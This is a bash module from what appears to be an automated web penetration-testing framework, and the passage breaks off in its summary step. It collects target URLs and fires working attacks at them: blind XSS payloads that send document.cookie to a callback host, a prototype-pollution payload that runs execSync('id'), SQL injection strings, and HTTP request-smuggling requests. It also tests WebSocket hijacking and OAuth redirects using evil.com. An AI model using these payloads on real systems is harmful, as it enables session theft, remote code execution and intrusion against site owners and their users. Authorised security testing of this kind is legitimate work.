#!/usr/bin/env bash

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 16: ADVANCED VULNERABILITY TESTING
# ═══════════════════════════════════════════════════════════════════════════════
# Purpose: Advanced vulnerability testing including:
#   - Blind XSS Hunter (OOB XSS with callback server)
#   - Prototype Pollution (DOM and server-side)
#   - Web Cache Deception
#   - HTTP Desync (Request Smuggling)
#   - Race Conditions (TOCTOU)
#   - GraphQL Deep Scan
#   - WebSocket Testing
#   - OAuth/OIDC Testing
# ═══════════════════════════════════════════════════════════════════════════════

advanced_vulns_main() {
    log_phase "PHASE 16: ADVANCED VULNERABILITY TESTING"
    
    if ! should_run_module "advanced_vulns_main" "ADVANCED_VULNS_ENABLED"; then
        return 0
    fi
    
    start_func "advanced_vulns_main" "Starting Advanced Vulnerability Testing"
    
    ensure_dir "${dir}/advanced_vulns"
    ensure_dir "${dir}/.tmp/advanced"
    
    # Prepare targets
    advanced_vulns_prepare_targets
    
    # Run advanced tests
    blind_xss_hunter
    prototype_pollution_scan
    web_cache_deception
    http_desync_check
    race_condition_test
    graphql_deep_scan
    websocket_testing
    oauth_oidc_testing
    
    # Aggregate results
    advanced_vulns_aggregate
    
    end_func "Advanced vulnerability testing completed" "advanced_vulns_main"
}

# ═══════════════════════════════════════════════════════════════════════════════
# PREPARE TARGETS
# ═══════════════════════════════════════════════════════════════════════════════

advanced_vulns_prepare_targets() {
    log_info "Preparing targets for advanced vulnerability testing..."
    
    # Collect URLs with parameters
    if [[ -s "${dir}/urls/urls.txt" ]]; then
        grep "?" "${dir}/urls/urls.txt" | head -n 1000 > "${dir}/.tmp/advanced/param_urls.txt" 2>/dev/null || true
    fi
    
    # Collect web hosts
    if [[ -s "${dir}/webs/webs.txt" ]]; then
        cp "${dir}/webs/webs.txt" "${dir}/.tmp/advanced/web_targets.txt"
    fi
    
    log_info "Prepared $(count_lines "${dir}/.tmp/advanced/param_urls.txt") parameter URLs"
    log_info "Prepared $(count_lines "${dir}/.tmp/advanced/web_targets.txt") web targets"
}

# ═══════════════════════════════════════════════════════════════════════════════
# BLIND XSS HUNTER (OOB XSS WITH CALLBACK SERVER)
# ═══════════════════════════════════════════════════════════════════════════════

blind_xss_hunter() {
    if ! should_run_module "blind_xss" "BLIND_XSS_ENABLED"; then
        return 0
    fi
    
    start_subfunc "blind_xss" "Running Blind XSS Hunter"
    
    ensure_dir "${dir}/advanced_vulns/blind_xss"
    
    # Check for callback server configuration
    local callback_server="${XSS_HUNTER_URL:-${INTERACTSH_SERVER:-}}"
    
    if [[ -z "$callback_server" ]]; then
        # Set up interactsh client for OOB detection
        if command_exists interactsh-client; then
            log_info "Starting interactsh for OOB detection..."
            
            # Generate unique interaction URL
            local interact_output="${dir}/.tmp/advanced/interactsh_output.txt"
            timeout 10 interactsh-client -v 2>&1 | head -5 > "$interact_output" &
            sleep 3
            
            callback_server=$(grep -oE '[a-z0-9]+\.oast\.[a-z]+' "$interact_output" 2>/dev/null | head -1)
        fi
    fi
    
    if [[ -z "$callback_server" ]]; then
        log_warning "No callback server configured for blind XSS. Set XSS_HUNTER_URL or INTERACTSH_SERVER"
        return 0
    fi
    
    log_info "Using callback server: $callback_server"
    
    # Generate blind XSS payloads
    local payloads_file="${dir}/.tmp/advanced/blind_xss_payloads.txt"
    cat > "$payloads_file" << EOF
"><script src=https://${callback_server}></script>
'><script src=https://${callback_server}></script>
<img src=x onerror="fetch('https://${callback_server}/?c='+document.cookie)">
"><img src=x onerror=fetch('https://${callback_server}')>
'"><svg/onload=fetch('https://${callback_server}')>
javascript:fetch('https://${callback_server}/?c='+document.cookie)
<script>new Image().src="https://${callback_server}/?c="+document.cookie</script>
"><iframe src="javascript:fetch('https://${callback_server}')">
<input onfocus=fetch('https://${callback_server}') autofocus>
<marquee onstart=fetch('https://${callback_server}')>
<body onload=fetch('https://${callback_server}')>
<svg><script>fetch('https://${callback_server}')</script></svg>
<math><mtext><table><mglyph><style><img src=x onerror="fetch('https://${callback_server}')">
EOF
    
    # Test with dalfox if available
    if command_exists dalfox && [[ -s "${dir}/.tmp/advanced/param_urls.txt" ]]; then
        log_info "Running dalfox with blind XSS payloads..."
        
        dalfox file "${dir}/.tmp/advanced/param_urls.txt" \
            -b "https://${callback_server}" \
            --custom-payload "$payloads_file" \
            --blind "https://${callback_server}" \
            -w "${DALFOX_THREADS:-50}" \
            -o "${dir}/advanced_vulns/blind_xss/dalfox_blind.txt" \
            --silence \
            2>> "$LOGFILE" || true
    fi
    
    # Manual injection on common blind XSS points
    log_info "Testing common blind XSS injection points..."
    
    local blind_points=(
        "name"
        "email"
        "comment"
        "feedback"
        "message"
        "subject"
        "title"
        "description"
        "content"
        "user"
        "username"
        "search"
        "q"
        "query"
        "contact"
        "address"
    )
    
    while IFS= read -r url; do
        [[ -z "$url" ]] && continue
        
        for param in "${blind_points[@]}"; do
            local payload="<script src=https://${callback_server}/?p=${param}></script>"
            local encoded_payload=$(echo "$payload" | jq -sRr @uri)
            
            # Test POST with common parameters
            curl -s -X POST "$url" \
                -d "${param}=${encoded_payload}" \
                -o /dev/null \
                -w "%{http_code}" \
                >> "${dir}/advanced_vulns/blind_xss/injection_log.txt" 2>/dev/null || true
                
        done
    done < <(head -n 50 "${dir}/.tmp/advanced/web_targets.txt")
    
    log_info "Blind XSS payloads injected. Monitor callback server for hits."
    end_subfunc "Blind XSS testing completed" "blind_xss"
}

# ═══════════════════════════════════════════════════════════════════════════════
# PROTOTYPE POLLUTION SCANNER
# ═══════════════════════════════════════════════════════════════════════════════

prototype_pollution_scan() {
    if ! should_run_module "prototype_pollution" "PROTOTYPE_POLLUTION_ENABLED"; then
        return 0
    fi
    
    start_subfunc "prototype_pollution" "Running Prototype Pollution Scanner"
    
    ensure_dir "${dir}/advanced_vulns/prototype_pollution"
    
    # Prototype pollution payloads
    local payloads=(
        "__proto__[test]=polluted"
        "__proto__.test=polluted"
        "constructor[prototype][test]=polluted"
        "constructor.prototype.test=polluted"
        "__proto__[status]=polluted"
        "__proto__[isAdmin]=true"
        "__proto__[admin]=true"
        "constructor[prototype][isAdmin]=true"
        "__proto__[headers][x-polluted]=true"
        "__proto__[outputFunctionName]=x]});process.mainModule.require('child_process').execSync('id')//["
    )
    
    local results_file="${dir}/advanced_vulns/prototype_pollution/findings.txt"
    
    while IFS= read -r url; do
        [[ -z "$url" ]] && continue
        
        for payload in "${payloads[@]}"; do
            # Test via query parameter
            local test_url="${url}${url/*\?*/&}${payload}"
            [[ "$url" != *"?"* ]] && test_url="${url}?${payload}"
            
            local response=$(curl -sL -m 10 "$test_url" 2>/dev/null)
            
            # Check for pollution indicators
            if echo "$response" | grep -qiE "polluted|__proto__|prototype"; then
                echo "[POTENTIAL] Prototype Pollution: $test_url" >> "$results_file"
            fi
            
            # Test via JSON body
            local json_payload="{\"__proto__\":{\"polluted\":\"yes\"}}"
            local json_response=$(curl -sL -m 10 -X POST "$url" \
                -H "Content-Type: application/json" \
                -d "$json_payload" 2>/dev/null)
            
            if echo "$json_response" | grep -qiE "polluted"; then
                echo "[POTENTIAL] JSON Prototype Pollution: $url" >> "$results_file"
            fi
        done
    done < <(head -n 100 "${dir}/.tmp/advanced/web_targets.txt")
    
    # Use nuclei prototype pollution templates
    if command_exists nuclei && [[ -s "${dir}/.tmp/advanced/param_urls.txt" ]]; then
        log_info "Running nuclei prototype pollution templates..."
        nuclei -l "${dir}/.tmp/advanced/param_urls.txt" \
            -tags prototype-pollution \
            -silent \
            -o "${dir}/advanced_vulns/prototype_pollution/nuclei_results.txt" \
            2>> "$LOGFILE" || true
    fi
    
    local finding_count=$(count_lines "$results_file")
    end_subfunc "Found $finding_count potential prototype pollution vulnerabilities" "prototype_pollution"
}

# ═══════════════════════════════════════════════════════════════════════════════
# WEB CACHE DECEPTION
# ═══════════════════════════════════════════════════════════════════════════════

web_cache_deception() {
    if ! should_run_module "web_cache_deception" "CACHE_DECEPTION_ENABLED"; then
        return 0
    fi
    
    start_subfunc "web_cache_deception" "Testing Web Cache Deception"
    
    ensure_dir "${dir}/advanced_vulns/cache_deception"
    
    # Cache deception path suffixes
    local cache_suffixes=(
        "nonexistent.css"
        "test.js"
        "any.jpg"
        "file.png"
        "style.css"
        "script.js"
        "image.gif"
        ".css"
        ".js"
        ".jpg"
        ".png"
        "%2F..%2Ftest.css"
        "/..;/test.css"
        "/../../../test.css"
    )
    
    local results_file="${dir}/advanced_vulns/cache_deception/findings.txt"
    
    while IFS= read -r url; do
        [[ -z "$url" ]] && continue
        
        # Get original response
        local original_response=$(curl -sI -m 10 "$url" 2>/dev/null)
        local original_cache_header=$(echo "$original_response" | grep -i "cache-control" || echo "")
        
        for suffix in "${cache_suffixes[@]}"; do
            local test_url="${url}/${suffix}"
            
            # First request
            local response1=$(curl -sI -m 10 "$test_url" 2>/dev/null)
            local status1=$(echo "$response1" | head -1 | awk '{print $2}')
            
            # Second request (should hit cache if vulnerable)
            sleep 1
            local response2=$(curl -sI -m 10 "$test_url" 2>/dev/null)
            
            # Check cache headers
            local cache_header=$(echo "$response2" | grep -i "x-cache\|cf-cache-status\|age:" || echo "")
            
            if [[ "$status1" == "200" ]] && echo "$cache_header" | grep -qiE "HIT|cached|age:[1-9]"; then
                echo "[POTENTIAL] Cache Deception: $test_url" >> "$results_file"
                echo "  Cache Header: $cache_header" >> "$results_file"
            fi
        done
    done < <(head -n 50 "${dir}/.tmp/advanced/web_targets.txt")
    
    # Test with nuclei
    if command_exists nuclei && [[ -s "${dir}/.tmp/advanced/web_targets.txt" ]]; then
        nuclei -l "${dir}/.tmp/advanced/web_targets.txt" \
            -tags cache \
            -silent \
            -o "${dir}/advanced_vulns/cache_deception/nuclei_results.txt" \
            2>> "$LOGFILE" || true
    fi
    
    local finding_count=$(count_lines "$results_file")
    end_subfunc "Found $finding_count potential cache deception vulnerabilities" "web_cache_deception"
}

# ═══════════════════════════════════════════════════════════════════════════════
# HTTP DESYNC / REQUEST SMUGGLING
# ═══════════════════════════════════════════════════════════════════════════════

http_desync_check() {
    if ! should_run_module "http_desync" "HTTP_DESYNC_ENABLED"; then
        return 0
    fi
    
    start_subfunc "http_desync" "Testing HTTP Request Smuggling"
    
    ensure_dir "${dir}/advanced_vulns/http_desync"
    
    local results_file="${dir}/advanced_vulns/http_desync/findings.txt"
    
    while IFS= read -r url; do
        [[ -z "$url" ]] && continue
        
        local host=$(echo "$url" | sed -E 's|https?://([^/]+).*|\1|')
        local port=443
        [[ "$url" == http://* ]] && port=80
        
        log_debug "Testing HTTP desync on: $host"
        
        # CL.TE Detection
        local clte_payload="POST / HTTP/1.1\r\nHost: ${host}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX"
        
        local response=$(echo -e "$clte_payload" | timeout 5 openssl s_client -connect "${host}:${port}" -quiet 2>/dev/null || true)
        
        if echo "$response" | grep -qiE "socket hang up|timeout|connection reset"; then
            echo "[POTENTIAL CL.TE] $url" >> "$results_file"
        fi
        
        # TE.CL Detection
        local tecl_payload="POST / HTTP/1.1\r\nHost: ${host}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n"
        
        local response2=$(echo -e "$tecl_payload" | timeout 5 openssl s_client -connect "${host}:${port}" -quiet 2>/dev/null || true)
        
        if echo "$response2" | grep -qiE "405|unrecognized|invalid"; then
            echo "[POTENTIAL TE.CL] $url" >> "$results_file"
        fi
        
    done < <(head -n 30 "${dir}/.tmp/advanced/web_targets.txt")
    
    # Use smuggler tool if available
    if command_exists smuggler; then
        log_info "Running smuggler tool..."
        while IFS= read -r url; do
            [[ -z "$url" ]] && continue
            smuggler -u "$url" >> "${dir}/advanced_vulns/http_desync/smuggler_results.txt" 2>> "$LOGFILE" || true
        done < <(head -n 20 "${dir}/.tmp/advanced/web_targets.txt")
    fi
    
    # Nuclei request smuggling templates
    if command_exists nuclei && [[ -s "${dir}/.tmp/advanced/web_targets.txt" ]]; then
        nuclei -l "${dir}/.tmp/advanced/web_targets.txt" \
            -tags http-smuggling \
            -silent \
            -o "${dir}/advanced_vulns/http_desync/nuclei_results.txt" \
            2>> "$LOGFILE" || true
    fi
    
    local finding_count=$(count_lines "$results_file")
    end_subfunc "Found $finding_count potential HTTP desync vulnerabilities" "http_desync"
}

# ═══════════════════════════════════════════════════════════════════════════════
# RACE CONDITION / TOCTOU TESTING
# ═══════════════════════════════════════════════════════════════════════════════

race_condition_test() {
    if ! should_run_module "race_condition" "RACE_CONDITION_ENABLED"; then
        return 0
    fi
    
    start_subfunc "race_condition" "Testing Race Conditions (TOCTOU)"
    
    ensure_dir "${dir}/advanced_vulns/race_condition"
    
    local results_file="${dir}/advanced_vulns/race_condition/findings.txt"
    
    # Identify potential race condition endpoints
    local race_keywords=(
        "checkout"
        "payment"
        "redeem"
        "coupon"
        "voucher"
        "transfer"
        "vote"
        "like"
        "follow"
        "apply"
        "claim"
        "withdraw"
        "deposit"
        "discount"
        "promo"
    )
    
    # Find URLs with race condition potential
    if [[ -s "${dir}/urls/urls.txt" ]]; then
        for keyword in "${race_keywords[@]}"; do
            grep -i "$keyword" "${dir}/urls/urls.txt" >> "${dir}/.tmp/advanced/race_targets.txt" 2>/dev/null || true
        done
        sort -u "${dir}/.tmp/advanced/race_targets.txt" -o "${dir}/.tmp/advanced/race_targets.txt"
    fi
    
    log_info "Found $(count_lines "${dir}/.tmp/advanced/race_targets.txt") potential race condition endpoints"
    
    # Test with parallel requests
    while IFS= read -r url; do
        [[ -z "$url" ]] && continue
        
        log_debug "Testing race condition on: $url"
        
        local responses_file="${dir}/.tmp/advanced/race_responses_$$.txt"
        
        # Send multiple concurrent requests
        for i in {1..10}; do
            curl -s -o /dev/null -w "%{http_code}\n" "$url" >> "$responses_file" &
        done
        wait
        
        # Analyze responses for inconsistencies
        local unique_codes=$(sort -u "$responses_file" | wc -l)
        
        if [[ $unique_codes -gt 1 ]]; then
            echo "[POTENTIAL] Race condition detected: $url" >> "$results_file"
            echo "  Response codes: $(cat "$responses_file" | sort | uniq -c)" >> "$results_file"
        fi
        
        rm -f "$responses_file"
        
    done < <(head -n 20 "${dir}/.tmp/advanced/race_targets.txt")
    
    # Use turbo-intruder style testing with GNU Parallel
    if command_exists parallel && [[ -s "${dir}/.tmp/advanced/race_targets.txt" ]]; then
        log_info "Running parallel race condition tests..."
        
        while IFS= read -r url; do
            [[ -z "$url" ]] && continue
            
            local parallel_results="${dir}/.tmp/advanced/parallel_race_$$.txt"
            
            # 50 parallel requests
            seq 50 | parallel -j50 "curl -s -o /dev/null -w '%{http_code}\n' '$url'" > "$parallel_results" 2>/dev/null
            
            local success_count=$(grep -c "200\|201\|302" "$parallel_results" 2>/dev/null || echo "0")
            
            if [[ $success_count -gt 1 ]]; then
                echo "[POTENTIAL] Multiple successful parallel requests: $url (count: $success_count)" >> "$results_file"
            fi
            
            rm -f "$parallel_results"
            
        done < <(head -n 10 "${dir}/.tmp/advanced/race_targets.txt")
    fi
    
    local finding_count=$(count_lines "$results_file")
    end_subfunc "Found $finding_count potential race conditions" "race_condition"
}

# ═══════════════════════════════════════════════════════════════════════════════
# GRAPHQL DEEP SCAN
# ═══════════════════════════════════════════════════════════════════════════════

graphql_deep_scan() {
    if ! should_run_module "graphql_deep" "GRAPHQL_DEEP_ENABLED"; then
        return 0
    fi
    
    start_subfunc "graphql_deep" "Running GraphQL Deep Scan"
    
    ensure_dir "${dir}/advanced_vulns/graphql"
    
    # Check for existing GraphQL endpoints
    local graphql_endpoints="${dir}/api/graphql_endpoints.txt"
    
    if [[ ! -s "$graphql_endpoints" ]]; then
        # Discover GraphQL endpoints
        log_info "Discovering GraphQL endpoints..."
        
        local graphql_paths=(
            "/graphql"
            "/graphql/console"
            "/graphql/api"
            "/graphql/v1"
            "/api/graphql"
            "/v1/graphql"
            "/v2/graphql"
            "/gql"
            "/query"
            "/playground"
            "/graphiql"
            "/altair"
            "/__graphql"
        )
        
        while IFS= read -r url; do
            [[ -z "$url" ]] && continue
            
            for path in "${graphql_paths[@]}"; do
                local full_url="${url}${path}"
                local response=$(curl -sX POST "$full_url" \
                    -H "Content-Type: application/json" \
                    -d '{"query":"query{__typename}"}' \
                    -m 5 2>/dev/null)
                
                if echo "$response" | grep -qE "__typename|data|Query|Mutation"; then
                    echo "$full_url" >> "$graphql_endpoints"
                fi
            done
        done < <(head -n 50 "${dir}/.tmp/advanced/web_targets.txt")
    fi
    
    [[ ! -s "$graphql_endpoints" ]] && {
        log_warning "No GraphQL endpoints found"
        end_subfunc "No GraphQL endpoints found" "graphql_deep"
        return 0
    }
    
    local results_file="${dir}/advanced_vulns/graphql/findings.txt"
    
    while IFS= read -r endpoint; do
        [[ -z "$endpoint" ]] && continue
        
        log_info "Scanning GraphQL endpoint: $endpoint"
        
        # 1. Introspection query
        log_debug "Testing introspection..."
        local introspection=$(curl -sX POST "$endpoint" \
            -H "Content-Type: application/json" \
            -d '{"query":"query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}' \
            -m 30 2>/dev/null)
        
        if echo "$introspection" | grep -q "__schema"; then
            echo "[INFO] Introspection enabled: $endpoint" >> "$results_file"
            echo "$introspection" | jq '.' > "${dir}/advanced_vulns/graphql/schema_$(echo "$endpoint" | md5sum | cut -d' ' -f1).json" 2>/dev/null || true
            
            # Extract types and fields
            echo "$introspection" | jq -r '.data.__schema.types[].name' 2>/dev/null | \
                grep -vE "^__" > "${dir}/advanced_vulns/graphql/types.txt" 2>/dev/null || true
        fi
        
        # 2. Batching attack
        log_debug "Testing batching attacks..."
        local batch_query='[{"query":"query{__typename}"},{"query":"query{__typename}"},{"query":"query{__typename}"}]'
        local batch_response=$(curl -sX POST "$endpoint" \
            -H "Content-Type: application/json" \
            -d "$batch_query" \
            -m 10 2>/dev/null)
        
        if echo "$batch_response" | grep -qE "\[.*__typename.*\]"; then
            echo "[POTENTIAL] Batching attack possible: $endpoint" >> "$results_file"
        fi
        
        # 3. Field suggestion / DoS
        log_debug "Testing field suggestions..."
        local suggestion_query='{"query":"query{systemUpdate}"}'
        local suggestion_response=$(curl -sX POST "$endpoint" \
            -H "Content-Type: application/json" \
            -d "$suggestion_query" \
            -m 10 2>/dev/null)
        
        if echo "$suggestion_response" | grep -qiE "did you mean|suggestions"; then
            echo "[INFO] Field suggestions enabled: $endpoint" >> "$results_file"
        fi
        
        # 4. SQL Injection in GraphQL
        log_debug "Testing SQLi in GraphQL..."
        local sqli_queries=(
            '{"query":"query{user(id:\"1 OR 1=1\"){name}}"}'
            '{"query":"query{user(id:\"1'\'' OR '\''1'\''='\''1\"){name}}"}'
            '{"query":"mutation{login(email:\"admin@test.com\" password:\"'\'' OR '\''1'\''='\''1\"){token}}"}'
        )
        
        for sqli in "${sqli_queries[@]}"; do
            local sqli_response=$(curl -sX POST "$endpoint" \
                -H "Content-Type: application/json" \
                -d "$sqli" \
                -m 10 2>/dev/null)
            
            if echo "$sqli_response" | grep -qiE "sql|syntax|mysql|postgresql|oracle|mssql"; then
                echo "[POTENTIAL] SQL injection in GraphQL: $endpoint" >> "$results_file"
                break
            fi
        done
        
        # 5. Authorization bypass
        log_debug "Testing authorization bypass..."
        local auth_queries=(
            '{"query":"query{users{id email password}}"}'
            '{"query":"query{allUsers{id admin role}}"}'
            '{"query":"mutation{updateUser(id:1 admin:true){id}}"}'
        )
        
        for auth_query in "${auth_queries[@]}"; do
            local auth_response=$(curl -sX POST "$endpoint" \
                -H "Content-Type: application/json" \
                -d "$auth_query" \
                -m 10 2>/dev/null)
            
            if echo "$auth_response" | grep -qE "\"data\":{\"" && ! echo "$auth_response" | grep -qiE "unauthorized|forbidden|denied"; then
                echo "[POTENTIAL] Authorization bypass: $endpoint - $auth_query" >> "$results_file"
            fi
        done
        
    done < "$graphql_endpoints"
    
    # Use graphql-cop or similar tool if available
    if command_exists graphql-cop; then
        log_info "Running graphql-cop..."
        while IFS= read -r endpoint; do
            graphql-cop -t "$endpoint" >> "${dir}/advanced_vulns/graphql/graphql_cop_results.txt" 2>> "$LOGFILE" || true
        done < "$graphql_endpoints"
    fi
    
    local finding_count=$(count_lines "$results_file")
    end_subfunc "Found $finding_count GraphQL vulnerabilities" "graphql_deep"
}

# ═══════════════════════════════════════════════════════════════════════════════
# WEBSOCKET TESTING
# ═══════════════════════════════════════════════════════════════════════════════

websocket_testing() {
    if ! should_run_module "websocket" "WEBSOCKET_ENABLED"; then
        return 0
    fi
    
    start_subfunc "websocket" "Running WebSocket Testing"
    
    ensure_dir "${dir}/advanced_vulns/websocket"
    
    local ws_endpoints="${dir}/advanced_vulns/websocket/endpoints.txt"
    local results_file="${dir}/advanced_vulns/websocket/findings.txt"
    
    # Discover WebSocket endpoints
    log_info "Discovering WebSocket endpoints..."
    
    local ws_paths=(
        "/ws"
        "/websocket"
        "/socket.io"
        "/sockjs"
        "/realtime"
        "/live"
        "/stream"
        "/chat"
        "/notifications"
        "/api/ws"
        "/api/websocket"
    )
    
    while IFS= read -r url; do
        [[ -z "$url" ]] && continue
        
        for path in "${ws_paths[@]}"; do
            local ws_url="${url}${path}"
            ws_url="${ws_url/http/ws}"
            
            # Try WebSocket connection
            if command_exists websocat; then
                local ws_test=$(echo "test" | timeout 5 websocat -t "$ws_url" 2>&1 || true)
                
                if [[ -n "$ws_test" ]] && ! echo "$ws_test" | grep -qiE "error|failed|refused"; then
                    echo "$ws_url" >> "$ws_endpoints"
                fi
            fi
        done
    done < <(head -n 30 "${dir}/.tmp/advanced/web_targets.txt")
    
    # Also check JavaScript files for WebSocket URLs
    if [[ -d "${dir}/js" ]]; then
        grep -rhoE "wss?://[^\"\'\`\s]+" "${dir}/js/" 2>/dev/null | sort -u >> "$ws_endpoints" || true
    fi
    
    sort -u "$ws_endpoints" -o "$ws_endpoints" 2>/dev/null || true
    
    [[ ! -s "$ws_endpoints" ]] && {
        log_warning "No WebSocket endpoints found"
        end_subfunc "No WebSocket endpoints found" "websocket"
        return 0
    }
    
    log_info "Found $(count_lines "$ws_endpoints") WebSocket endpoints"
    
    # Test WebSocket security
    while IFS= read -r ws_url; do
        [[ -z "$ws_url" ]] && continue
        
        log_debug "Testing WebSocket: $ws_url"
        
        # 1. Test for CSWSH (Cross-Site WebSocket Hijacking)
        local http_url="${ws_url/ws/http}"
        local response=$(curl -sI "$http_url" \
            -H "Origin: https://evil.com" \
            -H "Upgrade: websocket" \
            -H "Connection: Upgrade" \
            -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
            -H "Sec-WebSocket-Version: 13" \
            -m 10 2>/dev/null)
        
        if echo "$response" | grep -qi "101\|Switching Protocols" && ! echo "$response" | grep -qiE "forbidden|unauthorized"; then
            echo "[POTENTIAL] CSWSH vulnerability: $ws_url" >> "$results_file"
        fi
        
        # 2. Test for message injection
        if command_exists websocat; then
            local xss_payload='{"type":"message","data":"<script>alert(1)</script>"}'
            local sqli_payload='{"type":"query","data":"1 OR 1=1"}'
            
            # Send malicious messages
            echo "$xss_payload" | timeout 5 websocat -t "$ws_url" >> "${dir}/advanced_vulns/websocket/injection_test.txt" 2>/dev/null || true
            echo "$sqli_payload" | timeout 5 websocat -t "$ws_url" >> "${dir}/advanced_vulns/websocket/injection_test.txt" 2>/dev/null || true
        fi
        
    done < "$ws_endpoints"
    
    local finding_count=$(count_lines "$results_file")
    end_subfunc "Found $finding_count WebSocket vulnerabilities" "websocket"
}

# ═══════════════════════════════════════════════════════════════════════════════
# OAUTH/OIDC TESTING
# ═══════════════════════════════════════════════════════════════════════════════

oauth_oidc_testing() {
    if ! should_run_module "oauth_oidc" "OAUTH_OIDC_ENABLED"; then
        return 0
    fi
    
    start_subfunc "oauth_oidc" "Running OAuth/OIDC Security Testing"
    
    ensure_dir "${dir}/advanced_vulns/oauth"
    
    local results_file="${dir}/advanced_vulns/oauth/findings.txt"
    local oauth_endpoints="${dir}/advanced_vulns/oauth/endpoints.txt"
    
    # Discover OAuth/OIDC endpoints
    log_info "Discovering OAuth/OIDC endpoints..."
    
    local oauth_paths=(
        "/oauth"
        "/oauth2"
        "/auth"
        "/authorize"
        "/login"
        "/signin"
        "/connect"
        "/.well-known/openid-configuration"
        "/.well-known/oauth-authorization-server"
        "/oauth/authorize"
        "/oauth/token"
        "/oauth2/authorize"
        "/oauth2/token"
        "/api/oauth"
        "/auth/realms"
    )
    
    while IFS= read -r url; do
        [[ -z "$url" ]] && continue
        
        for path in "${oauth_paths[@]}"; do
            local full_url="${url}${path}"
            local status=$(curl -sI -o /dev/null -w "%{http_code}" -m 5 "$full_url" 2>/dev/null)
            
            if [[ "$status" == "200" ]] || [[ "$status" == "302" ]] || [[ "$status" == "401" ]]; then
                echo "$full_url" >> "$oauth_endpoints"
            fi
        done
        
        # Check for OIDC configuration
        local oidc_config=$(curl -sL "${url}/.well-known/openid-configuration" -m 5 2>/dev/null)
        if echo "$oidc_config" | jq -e '.issuer' > /dev/null 2>&1; then
            echo "[INFO] OIDC Configuration found: ${url}/.well-known/openid-configuration" >> "$results_file"
            echo "$oidc_config" | jq '.' > "${dir}/advanced_vulns/oauth/oidc_config_$(echo "$url" | md5sum | cut -d' ' -f1).json" 2>/dev/null || true
        fi
        
    done < <(head -n 30 "${dir}/.tmp/advanced/web_targets.txt")
    
    sort -u "$oauth_endpoints" -o "$oauth_endpoints" 2>/dev/null || true
    
    # Test OAuth vulnerabilities
    while IFS= read -r endpoint; do
        [[ -z "$endpoint" ]] && continue
        
        log_debug "Testing OAuth endpoint: $endpoint"
        
        # 1. Open Redirect in redirect_uri
        local redirect_payloads=(
            "https://evil.com"
            "https://evil.com%2F@legitimate.com"
            "https://legitimate.com.evil.com"
            "//evil.com"
            "https://legitimate.com%00.evil.com"
            "https://legitimate.com%252F@evil.com"
        )
        
        for payload in "${redirect_payloads[@]}"; do
            local test_url="${endpoint}?redirect_uri=${payload}&client_id=test&response_type=code"
            local response=$(curl -sI -m 5 "$test_url" 2>/dev/null)
            
            if echo "$response" | grep -qiE "location:.*evil\.com"; then
                echo "[POTENTIAL] OAuth open redirect: $test_url" >> "$results_file"
            fi
        done
        
        # 2. Token leakage via referrer
        local response=$(curl -sI "$endpoint" 2>/dev/null)
        if ! echo "$response" | grep -qiE "referrer-policy"; then
            echo "[INFO] Missing Referrer-Policy header: $endpoint" >> "$results_file"
        fi
        
        # 3. Insecure redirect_uri validation
        if [[ "$endpoint" == *"authorize"* ]]; then
            # Test with subdomain
            local base_domain=$(echo "$endpoint" | sed -E 's|https?://([^/]+).*|\1|')
            local subdomain_payload="https://evil.${base_domain}"
            local subdomain_test="${endpoint}?redirect_uri=${subdomain_payload}&client_id=test&response_type=code"
            
            local subdomain_response=$(curl -sI -m 5 "$subdomain_test" 2>/dev/null)
            if ! echo "$subdomain_response" | grep -qiE "invalid|error|forbidden"; then
                echo "[POTENTIAL] Subdomain redirect_uri accepted: $subdomain_test" >> "$results_file"
            fi
        fi
        
        # 4. State parameter validation
        local state_test="${endpoint}?client_id=test&response_type=code&redirect_uri=https://example.com"
        local state_response=$(curl -sI -m 5 "$state_test" 2>/dev/null)
        
        if ! echo "$state_test" | grep -q "state=" && echo "$state_response" | grep -qE "302|200"; then
            echo "[INFO] State parameter not required: $endpoint" >> "$results_file"
        fi
        
    done < "$oauth_endpoints"
    
    # Use nuclei OAuth templates
    if command_exists nuclei && [[ -s "$oauth_endpoints" ]]; then
        log_info "Running nuclei OAuth templates..."
        nuclei -l "$oauth_endpoints" \
            -tags oauth,oidc \
            -silent \
            -o "${dir}/advanced_vulns/oauth/nuclei_results.txt" \
            2>> "$LOGFILE" || true
    fi
    
    local finding_count=$(count_lines "$results_file")
    end_subfunc "Found $finding_count OAuth/OIDC vulnerabilities" "oauth_oidc"
}

# ═══════════════════════════════════════════════════════════════════════════════
# AGGREGATE RESULTS
# ═══════════════════════════════════════════════════════════════════════════════

advanced_vulns_aggregate() {
    log_info "Aggregating advanced vulnerability results..."
    
    local summary="${dir}/advanced_vulns/advanced_summary.txt"
    
    cat > "$summary" << EOF
Advanced Vulnerability Testing Summary for ${domain}
Generated: $(date)
═══════════════════════════════════════════════════════════════════════════════

BLIND XSS:
  Payloads Injected: Check callback server for hits
  $(count_lines "${dir}/advanced_vulns/blind_xss/dalfox_blind.txt") potential findings

PROTOTYPE POLLUTION:
  $(count_lines "${dir}/advanced_vulns/prototype_pollution/findings.txt") potential vulnerabilities

WEB CACHE DECEPTION:
  $(count_lines "${dir}/advanced_vulns/cache_deception/findings.txt") potential vulnerabilities

HTTP DESYNC/REQUEST SMUGGLING:
  $(count_lines "${dir}/advanced_vulns/http_desync/findings.txt") potential vulnerabilities

RACE CONDITIONS:
  $(count_lines "${dir}/advanced_vulns/race_condition/findings.txt") potential vulnerabilities

GRAPHQL:
  $(count_lines "${dir}/advanced_vulns/graphql/findings.txt") findings

WEBSOCKET:
  $(count_lines "${dir}/advanced_vulns/websocket/findings.txt") potential vulnerabilities

OAUTH/OIDC:
